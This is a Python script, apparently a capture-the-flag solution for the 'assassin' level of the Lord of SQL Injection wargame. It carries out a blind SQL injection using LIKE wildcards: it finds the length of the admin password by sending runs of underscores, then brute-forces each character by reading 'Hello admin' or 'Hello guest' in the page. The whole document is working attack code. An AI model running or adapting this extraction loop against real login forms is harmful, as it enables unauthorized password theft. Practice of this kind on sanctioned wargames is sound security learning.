import requests

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw="
head = {'Cookie' : 'PHPSESSID=값'}

length = 1
pwd = ''
query = "_"

while (1):
    query = "{}".format(query)
    req = requests.get(url+query, headers=head)
    print("[ +",length,"]")
    if "Hello guest" in req.text:
        print("총 길이는",length)
        break
    else:
        length = length + 1
        query = query + "_"

for i in range(1, length+1):
    print("찾는중.. ",i,"번째 문자")
    for j in range(48, 122):
        query = "_" * (i-1) + chr(j) + "_" * (length-i)
        req = requests.get(url+query, headers=head)
        if "Hello admin" in req.text:
            pwd += chr(j)
            break
        elif "Hello guest" in req.text:
            result = chr(j)
    if len(pwd)<i:
        pwd = pwd + result
            
print("pw : ",pwd)